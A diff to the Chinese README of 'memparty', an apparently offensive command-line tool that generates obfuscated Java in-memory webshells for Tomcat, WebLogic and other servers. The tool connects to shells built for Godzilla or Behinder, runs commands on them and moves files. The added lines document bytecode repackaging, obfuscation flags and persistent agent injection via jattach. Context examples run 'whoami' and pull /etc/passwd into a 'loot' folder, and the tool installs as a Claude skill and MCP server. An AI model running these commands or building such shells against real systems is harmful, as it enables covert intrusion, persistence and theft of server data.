@@ -12,6 +12,7 @@
 |------|------|
 | **生成内存马** | 约 17 种中间件/框架（Tomcat、Jetty、JBoss、WebLogic、SpringWebMvc、Undertow、Resin、Struts2…），9 种工具（哥斯拉、冰蝎、蚁剑、Command、suo5、NeoreGeorg、Proxy、自定义 class），Listener/Filter/Servlet/Agent 等多种挂载方式，60+ 种打包器（Base64、JSP、反序列化链、SpEL/OGNL 表达式注入、AgentJar…） |
 | **盲探测 probe** | 不知道目标是什么中间件时，先用 DNSLog / Sleep / 回显探测服务器类型和 JDK 版本 |
+| **字节码工具** | 解码任意 class，改名、包名替换、添加入口方法、混淆、回显 Wrapper 和打包 |
 | **连马验证 connect** | 用真实协议握手验证马是否存活、密码对不对（哥斯拉/冰蝎/suo5/mimic） |
 | **执行命令 exec** | 在已部署的哥斯拉/冰蝎马上执行命令，自动识别 Windows/Linux |
 | **传文件 upload/download** | 大文件自动分块，传完校验完整性（哥斯拉比大小、冰蝎比 MD5） |
@@ -140,6 +141,7 @@ memparty skill install --user --claude
 |------|--------|
 | `memparty gen` | 生成内存马（不带参数进入交互向导） |
 | `memparty probe` | 生成探测马，盲测目标中间件/JDK |
+| `memparty bytecode` | 解码、转换和打包任意 `.class` |
 | `memparty connect` | 验证马是否存活、凭据对不对 |
 | `memparty exec` | 在马上执行命令 |
 | `memparty upload` / `download` | 通过马上传/下载文件 |
@@ -172,11 +174,27 @@ memparty exec web1 --cmd "whoami"
 memparty download web1 /etc/passwd -o loot/passwd
 ```
 
-生成时的两个细节：
+生成时的几个细节：
 
 - `-o` 和 `--json` 可以同时用：文件照常写盘，JSON 里多一个 `outputFile` 字段（路径、大小、是否解码）。
-- 聚合 packer（如 `Base64`，一次返回多个变体）不能配 `-o`，会报错提示你换成叶子 packer（如 `DefaultBase64`）。
+- v3 中 `Base64` 等父项只是 packer 分类，要选具体变体（如 `DefaultBase64`）；旧 v2 后端仍支持聚合 packer，但不能配 `-o`。
+- v3 支持 `--obfuscate`、`--obfuscation-options key=value,...`、`--obfuscation-scope`（仅内存马）和 `--jdk java25`。
+- 探测支持 `-m ResponseHeader`；可用 `--resp-header-name` 指定回显头，未知中间件时 `--server Unknown`。
 - 走 MCP 时，`generate_memshell` / `generate_probe` 有个 `outputFile` 参数，效果同上。
+- Agent 加载参数使用 `--agent-args persist=true` 或 `--agent-args restore=true`；它是 attach 参数，不会发送给生成 API。JSON 和终端会给出 `java -jar agent.jar <pid> persist=true`、`jattach <pid> load instrument false agent.jar=persist=true` 示例。
+- 哥斯拉 WebSocket / RawWebSocket 使用 `ws://` 或 `wss://` 地址；Tomcat Upgrade 使用 HTTP 地址并加 `--upgrade-protocol <shellClassName>`。`GodzillaSession` 生成后仍选 `-t godzilla` 连接，客户端会保留会话 Cookie。
+
+### 字节码转换
+
+```bash
+memparty bytecode decode -f Payload.class
+memparty bytecode transform -f Payload.class \
+  --relocate-from javax.servlet --relocate-to jakarta.servlet -o JakartaPayload.class
+memparty bytecode transform -f Payload.class --server Tomcat \
+  --probe-method ResponseHeader -p DefaultBase64 -o Probe.class --json
+```
+
+也支持 Base64 参数或标准输入。`-o` 在没有 packer 时写转换后的 class；有 packer 时写打包结果。MCP 对应 `bytecode_decode` / `bytecode_transform`。
 
 拿不准有哪些合法取值，直接问后端（这些名字就是参数里要填的值）：
 
@@ -184,6 +202,8 @@ memparty download web1 /etc/passwd -o loot/passwd
 memparty config servers          # 支持哪些中间件
 memparty config tools Tomcat     # 这个中间件支持哪些工具和挂载类型
 memparty config packers          # 打包器列表（按投放方式选）
+memparty config tool-configs     # v3 各工具的参数名和枚举值
+memparty config obfuscation     # v3 混淆参数参考
 ```
 
 每个命令都能加 `--help` 看详细参数和例子；完整参数参考见 [英文 README](README.en.md)。
